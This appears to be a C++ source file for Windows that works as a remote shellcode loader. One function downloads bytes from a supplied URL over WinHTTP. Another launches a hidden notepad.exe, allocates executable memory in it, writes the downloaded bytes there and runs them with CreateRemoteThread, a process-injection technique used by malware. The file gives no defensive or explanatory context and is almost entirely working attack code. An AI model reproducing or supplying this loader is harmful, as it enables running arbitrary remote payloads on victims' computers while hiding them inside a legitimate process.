#include "header.h"

std::vector<BYTE> makeRequest(const URL& format){
    std::vector<BYTE>  buffer  {};
    HINTERNET          hSession{},
                       hRequest{};
    HANDLE             hConnect{};
    DWORD              dwBytesAvailable{};

    // Convert to Wide String
    std::wstring wide_format(format.host.begin(),  format.host.end()  );
    std::wstring wide_file(format.file.begin(), format.file.end() );

    // Create HTTP Session
    hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        NULL,
        NULL,
        WINHTTP_FLAG_ASYNC);

    if (hSession == NULL) {
        std::cout << "Failed to open http session:" << GetLastError() << '\n';
        std::exit(EXIT_FAILURE);
    }
    std::cout << "Opened http session\n";

    // Specify Target URL
    hConnect = WinHttpConnect(hSession,
         wide_format.c_str(),
         std::stoi(format.port),
         0);

    if (hConnect == NULL) {
        std::cout << "Failed to connect to server:" << GetLastError() << '\n';
        std::exit(EXIT_FAILURE);
    }
    std::wcout << "Connected to http server: " << wide_format.c_str() << '\n';

    // Send Request
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        wide_file.c_str(),
        L"HTTP/1.1",
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_REFRESH);

    if (hRequest == NULL) {
        std::cout << "Failed to open http request:" << GetLastError() << '\n';
        std::exit(EXIT_FAILURE);
    }
    std::cout << "Opened http request to: " << format.url << '\n';

    // Send Request
    BOOL bSend = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        NULL,
        WINHTTP_NO_REQUEST_DATA,
        NULL,
        NULL,
        NULL);

    if (!bSend) {
        std::cout << "Failed to send request:" << GetLastError() << '\n';
        std::exit(EXIT_FAILURE);
    }

    // Receive Data Size
    if ( !WinHttpReceiveResponse(hRequest,NULL) ) {
        std::cout << "Failed to receive response:" << GetLastError() << '\n';
        std::exit(EXIT_FAILURE);
    }
    std::cout << "Getting data...\n";

    // Loop getting data until its empty
    do {
        dwBytesAvailable = 0;

        WinHttpQueryDataAvailable(hRequest, &dwBytesAvailable);

        // If No available bytes then break
        if (!dwBytesAvailable)
            break;

        // Get Data
        std::vector<BYTE>  temp      (dwBytesAvailable);
        WinHttpReadData(hRequest,temp.data(),dwBytesAvailable,NULL);

        // Write temp into buffer
        buffer.insert(buffer.end(),temp.begin(),temp.end());

    } while (dwBytesAvailable > 0);


    // Cleanup
    std::cout << "Cleaning up...\n";
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    std::cout << "Done.\n";
    return buffer;
}


void injectProcess(std::vector<BYTE>& buffer) {
    std::cout << "Injecting process...\n";
    PVOID alloc{};

    // Hide Window
    STARTUPINFOW        si{.cb = sizeof(STARTUPINFOW),.dwFlags = STARTF_USESHOWWINDOW,.wShowWindow = SW_HIDE};
    PROCESS_INFORMATION pi{};

    wchar_t cmd[] = L"notepad.exe";
     CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE |CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);

    alloc = VirtualAllocEx(
        pi.hProcess,
        NULL,
        buffer.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(
        pi.hProcess,
        alloc,
        buffer.data(),
        buffer.size(),
        NULL);

    CreateRemoteThread(pi.hProcess,
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE)alloc,
        NULL,
        0,
        NULL);

    WaitForSingleObject(pi.hThread,2000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}



URL formatURL(URL& format) {

    format.port = "80"; // Default port

    // Remove HTTP
    size_t scheme_pos = format.url.find("://");
    if (scheme_pos != std::string::npos) {
        std::string scheme = format.url.substr(0, scheme_pos);
        if (scheme == "https") {
            format.port = "443";
        }
        format.url.erase(0, scheme_pos + 3);
    }

    // Find the start of the file path
    size_t path_pos = format.url.find('/');

    std::string host_port;

    if (path_pos != std::string::npos) {
        host_port = format.url.substr(0, path_pos);
        format.file = format.url.substr(path_pos);
    } else {
        host_port = format.url;
        format.file = "/";
    }

    // Extract ip and port
    std::string host;
    std::string port = format.port;

    size_t port_pos = host_port.find(':');
    if (port_pos != std::string::npos) {
        format.host = host_port.substr(0, port_pos);
        format.port = host_port.substr(port_pos + 1);
    } else {
        format.host = host_port;
    }

    return format;
}
